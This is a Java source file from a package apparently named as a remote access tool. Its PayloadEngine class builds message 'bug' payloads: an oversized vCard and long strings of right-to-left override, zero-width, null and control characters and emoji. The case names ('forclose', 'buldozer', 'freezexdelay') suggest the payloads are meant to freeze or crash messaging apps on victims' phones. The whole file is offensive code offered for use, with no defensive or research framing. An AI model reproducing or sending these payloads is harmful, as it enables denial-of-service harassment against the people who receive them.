package com.xkiluaa.rat;

public class PayloadEngine {

    public static String getPayload(String type) {
        if (type == null) return "test";
        switch (type) {
            case "forclose":     return buildVCard();
            case "spambkp":      return buildSpamBackup();
            case "delayinvis":   return buildInvisible();
            case "buldozer":     return buildBulldozer();
            case "blankxstc":    return buildBlankSticker();
            case "freezexdelay": return buildFreezeDelay();
            default:             return "test";
        }
    }

    private static String buildVCard() {
        StringBuilder sb = new StringBuilder("BEGIN:VCARD\nVERSION:3.0\nFN:");
        for (int i = 0; i < 20000; i++) sb.append("X");
        sb.append("\nTEL;type=CELL:+62").append(repeat("9", 30));
        sb.append("\nEND:VCARD");
        return sb.toString();
    }

    private static String buildSpamBackup() {
        return repeat("\u202E", 15000) + repeat("\u0000", 3000);
    }

    private static String buildInvisible() {
        return repeat("\u200B", 50000) + repeat("\u202E", 5000);
    }

    private static String buildBulldozer() {
        return repeat("\uD83E\uDE78", 5000) + repeat("\uD83D\uDC80", 5000) + repeat("\u202E", 8000);
    }

    private static String buildBlankSticker() {
        return repeat("\u0000\u0001\u0002", 10000);
    }

    private static String buildFreezeDelay() {
        return repeat("\uD83D\uDE08", 4000) + repeat("\u200B", 20000) + repeat("\u202E", 4000);
    }

    private static String repeat(String s, int n) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < n; i++) sb.append(s);
        return sb.toString();
    }
}